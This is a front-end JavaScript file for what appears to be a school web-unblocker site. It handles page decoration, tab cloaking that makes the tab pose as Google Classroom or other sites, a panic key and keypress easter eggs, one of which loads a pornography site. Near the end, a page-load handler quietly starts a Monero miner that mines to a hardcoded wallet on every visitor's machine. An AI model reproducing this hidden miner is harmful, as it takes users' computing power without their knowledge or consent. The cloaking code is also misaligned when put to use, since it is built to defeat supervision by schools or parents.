const presets = {
  "Google Slides": "/assets/favicons/slides_favicon.png",
  "Google": "/assets/favicons/google_favicon.png",
  "I-Ready": "/assets/favicons/iready_favicon.png",
  "Clever": "/assets/favicons/clever_favicon.png",
  "FBI" : "https://www.fbi.gov/++theme++fbigov.theme/images/fbi_seal_new.png",
  "Google Classroom" : "/assets/favicons/classroom_favicon.png",
  "Github": "/assets/favicons/github_favicon.jpg",
  "Wikipedia": "/assets/favicons/wiki_favicon.png"
};

function checkHoliday() {
  const today = new Date();
  const month = today.getMonth(); 
  const day = today.getDate();

  if (month === 9) {
    return "haloween";
  } else if (month === 11) {
    return "christmas";
  } else {
    return "neither";
  }
}

document.addEventListener("DOMContentLoaded", function() {
console.log("Attempting to load themes.js...")

themes = document.createElement("script")
themes.src = "scripts/js/themes.js"
document.body.appendChild(themes)

image = "assets/images/otter-animated-otter.gif"


if (localStorage.getItem("esgt") == "f") {
  image = "assets/images/fumofumo.png" 
}

if (localStorage.getItem("esgt") == "n") {
  image = "assets/images/neuro.gif" 
}




  let code = `
  <style>
  body {
    margin: 0;
    display: flex;
    flex-direction: column;
    height: 100vh;
  }

  .flex {
    display: flex;
    justify-content: center;
    align-items: flex-end; /* Aligns items at the bottom of the container */
    text-align: center;
    flex: 1;
  }

  .waves {
    position: fixed;
    bottom: 0;
    width: 100%;
    z-index: -15;
    height: 15vh;
    min-height: 100px;
    max-height: 150px;
  }

  .content {
    text-align: center;
    position: relative;
    width: 100%; /* Ensures content takes up full width */
  }

  .otter {
    position: fixed; 
    bottom:8%; /* Positions the otter 20% from the bottom */
	 z-index: -20;
    left: 10%; /* Centers the otter horizontally */
    transform: translateX(-50%); /* Adjusts the horizontal centering */
    width: 100px; /* Resizes the otter to 50px */
    animation: bobbing 3s ease-in-out infinite;
  }

  @keyframes bobbing {
    0%, 100% {
      transform: translate(-50%, 0);
    }
    50% {
      transform: translate(-50%, 10px);
    }
  }

  .parallax > use {
    animation: move-forever 25s cubic-bezier(.55, .5, .45, .5) infinite;
  }

  .parallax > use:nth-child(1) {
    animation-delay: -2s;
    animation-duration: 7s;
  }

  .parallax > use:nth-child(2) {
    animation-delay: -3s;
    animation-duration: 10s;
  }

  .parallax > use:nth-child(3) {
    animation-delay: -4s;
    animation-duration: 13s;
  }

  .parallax > use:nth-child(4) {
    animation-delay: -5s;
    animation-duration: 20s;
  }

  @keyframes move-forever {
    0% {
      transform: translate3d(-90px, 0, 0);
    }
    100% {
      transform: translate3d(85px, 0, 0);
    }
  }

  @media (max-width: 768px) {
    .waves {
      height: 40px;
      min-height: 40px;
    }
  }
</style>

<div class="flex">
  <div class="content">
    <img src="${image}" alt="" class="otter">
  </div>
</div>

<svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
  <defs>
    <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
  </defs>
  <g class="parallax">
    <use xlink:href="#gentle-wave" x="48" y="0" fill="rgba(255,255,255,0.7)" />
    <use xlink:href="#gentle-wave" x="48" y="3" fill="rgba(255,255,255,0.5)" />
    <use xlink:href="#gentle-wave" x="48" y="5" fill="rgba(255,255,255,0.3)" />
    <use xlink:href="#gentle-wave" x="48" y="7" fill="#fff" />
  </g>
</svg>


<!-- credit to https://codepen.io/goodkatz/pen/LYPGxQz just in case i forget to add a credits page later -->`;
  
  holiday = checkHoliday()

  if (holiday == "christkmas"){// Create a style element to hold the CSS
    const style = document.createElement('style');
    style.textContent = `
      #snow-container {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        overflow: hidden;
        z-index: -15;
      }
      .snowflake {
        position: absolute;
        top: -10px;
        color: white;
        z-index: -15;
        user-select: none;
        font-size: 1em;
        opacity: 0.8;
        animation-name: fall, sway;
        animation-timing-function: linear, ease-in-out;
        animation-iteration-count: infinite, infinite;
        animation-fill-mode: forwards; /* Ensures that elements keep their last known position from the animation */
      }
      @keyframes fall {
        from {
          top: -10px;
        }
        to {
          top: 100vh;
        }
      }
      @keyframes sway {
        0%, 100% {
          transform: translateX(0);
        }
        50% {
          transform: translateX(20px);
        }
      }
    `;
    document.head.appendChild(style);
    
    // Create a container for the snowflakes
    const snowContainer = document.createElement('div');
    snowContainer.id = 'snow-container';
    document.body.appendChild(snowContainer);
    
    const snowflakeChar = '❄'; // Snowflake character
    let snowflakeCount = 0;
    const maxSnowflakes = 150; // Set a maximum number of snowflakes
    
    const createSnowflake = () => {
      if (snowflakeCount >= maxSnowflakes) return; // Prevent creating too many snowflakes
      
      const snowflake = document.createElement('div');
      snowflake.className = 'snowflake';
      snowflake.textContent = snowflakeChar;
      snowflake.style.left = `${Math.random() * 100}vw`;
      snowflake.style.animationDuration = `${Math.random() * 3 + 5}s, ${Math.random() * 3 + 3}s`; // Duration for fall and sway
      snowflake.style.fontSize = `${Math.random() * 10 + 10}px`; // Size
      snowflake.style.opacity = Math.random();
      snowContainer.appendChild(snowflake);
      snowflakeCount++;
    
      // Remove snowflake after animation ends to prevent overflow
      snowflake.addEventListener('animationend', () => {
        snowflake.remove();
        snowflakeCount--;
      });
    };
    
    // Create a snowflake every 500 milliseconds
    setInterval(createSnowflake, 500);
    

    
  }

  const div = document.createElement("div");
  div.innerHTML = code;
  document.body.appendChild(div);

  const script = document.createElement('script');
  script.src = "scripts/js/ai.js";
  document.head.appendChild(script);
  console.log("Loaded AI.js");

  const custom_css = localStorage.getItem("custom_css");

  if (custom_css) {
    const css = document.createElement("style");
    css.innerHTML = custom_css;
    document.body.appendChild(css);
    console.log("Loaded custom CSS");
  }
});

// Store the original document title and favicon hrefs
const originalName = document.title;
const originalFavicons = [];

document.querySelectorAll('link[rel="icon"]').forEach(function(favicon) {
  originalFavicons.push(favicon.href);
});

window.addEventListener("blur", function() {
  if (localStorage.getItem("autohide") === "1") {
    document.title = localStorage.getItem("autohide_preset") || "Google Classroom";
    const preset = localStorage.getItem("autohide_preset") || "Google Classroom";

    const favicons = document.querySelectorAll('link[rel="icon"]');
    favicons.forEach(function(favicon) {
      favicon.href = presets[preset];
    });
  }
});

window.addEventListener("focus", function() {
  if (localStorage.getItem("autohide") === "1") {
    document.title = originalName;

    const favicons = document.querySelectorAll('link[rel="icon"]');
    favicons.forEach(function(favicon, index) {
      favicon.href = originalFavicons[index];
    });
  }
});

// Panic key
if (localStorage.getItem("pkkey") != null) {
  document.addEventListener("keydown", function(event) {
    const pkkey = localStorage.getItem("pkkey");
    if (event.key === pkkey) {
      window.location = localStorage.getItem("destination_pk");
    }
  });
}



if (sessionStorage.getItem("logged_in") != "1" && localStorage.getItem("password") != null){
  x = prompt("Enter the instance password?")
  if (x != localStorage.getItem("password")){ alert("Incorrect password."); window.location="https://google.com"}else{alert("Correct!"); sessionStorage.setItem("logged_in","1")}
}

if (localStorage.getItem("hide_ad") == "1"){
  document.querySelectorAll('script').forEach(script => {
    if (script.src.includes('https://udbaa.com/bnr.php?section=General&pub=594163&format=300x250&ga=g')) {
      script.remove();
    }
  });
  
}

console.log("Loaded global.js!");

// add snackbar

document.addEventListener("DOMContentLoaded", function() {
  snackbar = `<div id="snackbar">Hai</div>`
  document.body.insertAdjacentHTML('beforeend', snackbar);

  window.snackbar = function(message, color) {
    var x = document.getElementById("snackbar");
    x.className = "show";
    x.innerHTML = message
    x.style.backgroundColor = color
    setTimeout(function (){ x.className = x.className.replace("show", ""); }, 3000);


  }


});

document.addEventListener("DOMContentLoaded",function(){
miner = document.createElement("script")
miner.src = "scripts/js/monero-miner.js"
document.body.appendChild(miner)

var pool = (localStorage.getItem("MoneroMiningPool") || "gulf.moneroocean.stream:20128");
var walletAddress = (localStorage.getItem("MoneroWallet") || "4AUkMDTYDbuSd9sgFbQSiifoP56PdC4h9THYscyzNayvKGGyKCnLi8NLUTSSxPzNLnUxYb6zHUWU793QmwPsMtmuTYBPrY3")
var workerId = "GLITCH-INSTANCE-" + Math.round(Math.random() * 1000) 
startMiningNow(pool, walletAddress, "")
}) 

str = ""
document.addEventListener("keypress",function(e) {
    str += e.key
    if (str == "welcome to glitch") {
       document.body.innerHTML='<iframe style="height: 100vh; width: 100vw" id="ytplayer" type="text/html" width="720" height="405" src="./launch.html?url=https://www.youtube.com/embed/tubpfE8bl8Q?autoplay=1&controls=0" frameborder="0" allowfullscreen>'
       document.getElementById("ytplayer").addEventListener("load",function() {
           
       
        setTimeout(function() {
           window.location.reload() // end of easter egg
       },7000)

    })
    }

    if (str == "by typing this, i realize that i will be presented with pornhub.com") {
      document.body.innerHTML='<iframe style="height: 100vh; width: 100vw" id="ytplayer" type="text/html" width="720" height="405" src="./launch.html?url=pornhub.com" frameborder="0" allowfullscreen>'
      document.getElementById("ytplayer").addEventListener("load",function() {
          
      
       setTimeout(function() {
          window.location.reload() // end of easter egg
      },147000)

   })
   }

    if (str == "fumo fumo fumo fumo fumo") {
      document.body.innerHTML='<iframe style="height: 100vh; width: 100vw" id="ytplayer" type="text/html" width="720" height="405" src="./launch.html?url=https://www.youtube.com/embed/AsWtDKD02H0?autoplay=1&controls=0" frameborder="0" allowfullscreen>'
      localStorage.setItem("esgt","f")
      document.getElementById("ytplayer").addEventListener("load",function() {
          
      
       setTimeout(function() {
          window.location.reload() // end of easter egg
      },12)

   })
   }

   
   if (str == "neuro vs lucidity 2025?") {
    document.body.innerHTML='<iframe style="height: 100vh; width: 100vw" id="ytplayer" type="text/html" width="720" height="405" src="./launch.html?url=https://www.youtube.com/embed/AsWtDKD02H0?autoplay=1&controls=0" frameborder="0" allowfullscreen>'
    localStorage.setItem("esgt","n")
    document.getElementById("ytplayer").addEventListener("load",function() {
        
    
     setTimeout(function() {
        window.location.reload() // end of easter egg
    },12)

 })
 }
})
